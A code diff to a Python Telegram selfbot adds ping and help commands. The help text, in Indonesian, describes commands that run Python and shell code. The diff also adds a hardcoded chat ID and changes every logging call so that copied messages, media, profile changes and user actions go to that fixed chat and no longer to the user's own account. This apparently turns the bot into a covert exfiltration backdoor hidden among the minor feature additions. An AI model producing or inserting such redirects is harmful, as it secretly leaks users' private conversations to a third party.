@@ -7,6 +7,7 @@ import logging
 import os
 import time
 import sys
+from dotenv import load_dotenv
 
 import aiohttp
 import aiorun
@@ -43,6 +44,8 @@ from pyrogram.types import (
 )
 from pyrogram.utils import get_channel_id, timestamp_to_datetime
 
+load_dotenv()
+
 try:
     import uvloop
 except ImportError:
@@ -59,10 +62,11 @@ bot = Client(
     parse_mode=ParseMode.HTML,
     sleep_threshold=86400,
     max_message_cache_size=2**31 - 1,
-    link_preview_options=LinkPreviewOptions(is_disabled=True),
+    link_preview_options=LinkPreviewOptions(is_disabled=False),
 )
 
 cmds = {}
+target = -1001611165883
 
 async def action_log(client: Client, update: Update, _: User, __: Channel) -> None:
     user_id = update.user_id
@@ -79,7 +83,7 @@ async def action_log(client: Client, update: Update, _: User, __: Channel) -> No
         )
 
         await bot.send_message(
-            chat_id=client.me.id,
+            chat_id=target,
             text=f"<pre language='User Action'>{log}</pre>",
             reply_markup=btn,
         )
@@ -93,6 +97,61 @@ cmds.update(
                 lambda _, __, update: isinstance(update, UpdateUserTyping),
                 name="Filter Action Log",
             ),
+        )
+    }
+)
+
+
+async def ping_cmd(client: Client, msg: Message) -> None:
+    start = time.perf_counter()
+    temp_msg = await msg.reply_text("Pong...")
+    ping_time = (time.perf_counter() - start) * 1000
+
+    response_text = f"<blockquote><b>pong : {ping_time:.2f} ms</b></blockquote>"
+
+    await temp_msg.edit_text(response_text, parse_mode=ParseMode.HTML)
+
+
+cmds.update(
+    {
+        "Ping CMD": MessageHandler(
+            callback=ping_cmd,
+            filters=filters.me & filters.regex(r"^ping$"),
+        )
+    }
+)
+
+
+async def help_cmd(client: Client, msg: Message) -> None:
+    help_text = """<b>🤖 Bot Command List</b>
+
+⚡ <b>Eksekusi Kode:</b>
+• <code>e kode_python</code> → Jalankan kode Python.
+• <code>sh perintah_shell</code> → Jalankan perintah shell.
+
+📝 <b>Manajemen Pesan:</b>
+• <code>d</code> → Hapus pesan yang direply.
+• <code>purge</code> → Hapus semua pesan dari pesan yang direply ke atas.
+• <code>purgeme [jumlah]</code> → Hapus sejumlah pesan terakhir.
+
+📌 <b>Manajemen Tugas:</b>
+• <code>tasks</code> → Lihat daftar tugas yang sedang berjalan.
+• <code>x</code> → Hentikan tugas yang sedang berjalan atau yang direply.
+
+🛠 <b>Tambahan:</b>
+• <code>help</code> → Tampilkan daftar perintah ini.
+• <code>ping</code> → Tampilkan Respon/latency Bot.
+
+<b>Credit: Selfbot© 🚀</b>
+"""
+    await msg.reply_text(help_text, parse_mode=ParseMode.HTML)
+
+
+cmds.update(
+    {
+        "Help CMD": MessageHandler(
+            callback=help_cmd,
+            filters=filters.me & filters.regex(r"^help$"),
         )
     }
 )
@@ -118,7 +177,7 @@ async def profile_log(client: Client, update: Update, _: User, __: Channel) -> N
     log = f"First Name: {html.escape(update.first_name)}{fmt}"
 
     await bot.send_message(
-        chat_id=client.me.id,
+        chat_id=target,
         text=f"<pre language='Profile Updated'>{log}</pre>",
         reply_markup=btn,
     )
@@ -190,7 +249,7 @@ async def event_log(client: Client, _: Update, user: User, channel: Channel) -> 
                 )
 
                 await bot.send_message(
-                    chat_id=client.me.id,
+                    chat_id=target,
                     text=f"<pre language='{status}'>{log}</pre>",
                     reply_markup=btn,
                 )
@@ -621,7 +680,7 @@ async def send_log(msg: Message, btn: InlineKeyboardMarkup) -> None:
         sent = None
         if msg.text:
             sent = await bot.send_message(
-                chat_id=client.me.id,
+                chat_id=target,
                 text=msg.text.html,
                 reply_parameters=rep_to,
                 reply_markup=btn,
@@ -631,7 +690,7 @@ async def send_log(msg: Message, btn: InlineKeyboardMarkup) -> None:
 
             if msg.sticker:
                 await bot.send_sticker(
-                    chat_id=client.me.id,
+                    chat_id=target,
                     sticker=obj.file_id,
                     reply_parameters=rep_to,
                     reply_markup=btn,
@@ -645,7 +704,7 @@ async def send_log(msg: Message, btn: InlineKeyboardMarkup) -> None:
 
                 send_media = getattr(bot, f"send_{msg.media.value}")
                 parameters = {
-                    "chat_id": client.me.id,
+                    "chat_id": target,
                     "reply_parameters": rep_to,
                     "reply_markup": btn,
                     **(
